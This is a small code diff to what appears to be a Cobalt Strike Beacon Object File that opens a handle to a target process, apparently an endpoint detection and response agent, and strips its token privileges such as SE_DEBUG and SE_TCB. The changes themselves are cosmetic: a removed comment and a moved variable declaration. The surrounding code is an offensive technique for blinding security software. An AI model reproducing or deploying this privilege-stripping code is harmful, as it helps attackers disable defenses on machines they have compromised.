@@ -134,7 +134,6 @@ void stripPrivileges(HANDLE edrHandle)
 		BeaconPrintf(CALLBACK_ERROR, "[!] Error adjusting the target process token privilege!, Error: %i", KERNEL32$GetLastError());
 	}
 
-	// Remove all the privileges
 	DeleteTokenPrivilege(edrToken, SE_DEBUG_NAME);
 	DeleteTokenPrivilege(edrToken, SE_CHANGE_NOTIFY_NAME);
 	DeleteTokenPrivilege(edrToken, SE_TCB_NAME);
@@ -182,6 +181,7 @@ void go(char* args, int len)
 		return;
 	}
 
+	HANDLE targetHandle;
 	datap parser;
 	DWORD pid = NULL;
 
@@ -200,9 +200,7 @@ void go(char* args, int len)
 
 	getDebugPriv();
 
-	HANDLE targetHandle;
 	targetHandle = getHandleToTargetProc(pid);
 	stripPrivileges(targetHandle);
 	return;
-
 }
